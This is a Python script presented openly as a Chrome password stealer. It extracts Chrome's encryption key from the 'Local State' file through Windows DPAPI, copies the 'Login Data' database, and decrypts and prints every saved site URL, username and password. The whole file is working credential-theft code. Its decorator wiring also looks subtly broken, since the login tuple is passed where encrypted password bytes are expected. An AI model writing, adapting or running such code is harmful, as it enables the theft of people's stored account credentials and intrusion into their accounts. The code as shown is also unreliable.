import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta


class ChromePasswordStealer:
    CHROME_USER_DATA_PATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    CHROME_DB_PATH = os.path.join(CHROME_USER_DATA_PATH, "default", "Login Data")
    BACKUP_DB_PATH = "ChromeDataBackup.db"

    def __init__(self):
        self.encryption_key = None

    @staticmethod
    def chrome_timestamp_to_datetime(chrome_timestamp):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_timestamp)

    @staticmethod
    def create_backup(func):
        def wrapper(self, *args, **kwargs):
            backup_path = self.backup_database()
            result = func(self, backup_path, *args, **kwargs)
            self.remove_backup()
            return result
        return wrapper

    @staticmethod
    def load_encryption_key(func):
        def wrapper(self, *args, **kwargs):
            if not self.encryption_key:
                self.encryption_key = self._retrieve_encryption_key()
            if not self.encryption_key:
                print("Unable to retrieve Chrome encryption key.")
                return None
            return func(self, *args, **kwargs)
        return wrapper

    @staticmethod
    def _retrieve_encryption_key():
        local_state_path = os.path.join(ChromePasswordStealer.CHROME_USER_DATA_PATH, "Local State")
        try:
            with open(local_state_path, "r", encoding="utf-8") as file:
                local_state = json.load(file)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except (FileNotFoundError, KeyError, json.JSONDecodeError) as error:
            print(f"Error reading local state: {error}")
            return None

    @staticmethod
    def decrypt_password(func):
        def wrapper(self, encrypted_password, *args, **kwargs):
            try:
                iv = encrypted_password[3:15]
                password_data = encrypted_password[15:]
                cipher = AES.new(self.encryption_key, AES.MODE_GCM, iv)
                decrypted_password = cipher.decrypt(password_data)[:-16].decode()
            except Exception as error:
                print(f"Failed to decrypt password using AES: {error}")
                try:
                    decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                except Exception as fallback_error:
                    print(f"Failed to decrypt using fallback: {fallback_error}")
                    return None
            return func(self, decrypted_password, *args, **kwargs)
        return wrapper

    def backup_database(self):
        try:
            shutil.copyfile(self.CHROME_DB_PATH, self.BACKUP_DB_PATH)
            return self.BACKUP_DB_PATH
        except (FileNotFoundError, IOError) as error:
            print(f"Failed to backup Chrome database: {error}")
            return None

    def remove_backup(self):
        try:
            os.remove(self.BACKUP_DB_PATH)
        except OSError as error:
            print(f"Failed to remove backup database: {error}")

    @create_backup
    @load_encryption_key
    def retrieve_logins(self, backup_db_path):
        try:
            with sqlite3.connect(backup_db_path) as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used
                    FROM logins ORDER BY date_created
                """)
                return cursor.fetchall()
        except sqlite3.Error as db_error:
            print(f"Database query error: {db_error}")
            return []

    @decrypt_password
    def format_login_data(self, decrypted_password, login_data):
        origin_url, action_url, username, encrypted_password, date_created, date_last_used = login_data
        if username and decrypted_password:
            creation_date = self.chrome_timestamp_to_datetime(date_created) if date_created != 86400000000 and date_created else "N/A"
            last_used_date = self.chrome_timestamp_to_datetime(date_last_used) if date_last_used != 86400000000 and date_last_used else "N/A"
            return {
                "Origin URL": origin_url,
                "Action URL": action_url,
                "Username": username,
                "Password": decrypted_password,
                "Creation Date": creation_date,
                "Last Used": last_used_date
            }
        return None

    def display_logins(self, logins):
        print("\n" + "="*70)
        print(f"{'Origin URL':<30} {'Action URL':<30} {'Username':<20} {'Password':<20} {'Creation Date':<20} {'Last Used':<20}")
        print("="*70)
        for login in logins:
            formatted_data = self.format_login_data(login)
            if formatted_data:
                print(f"{formatted_data['Origin URL']:<30} {formatted_data['Action URL']:<30} "
                      f"{formatted_data['Username']:<20} {formatted_data['Password']:<20} "
                      f"{formatted_data['Creation Date']:<20} {formatted_data['Last Used']:<20}")
        print("="*70)

    def run(self):
        logins = self.retrieve_logins()
        if logins:
            self.display_logins(logins)


if __name__ == "__main__":
    givemeall = ChromePasswordStealer()
    givemeall.run()
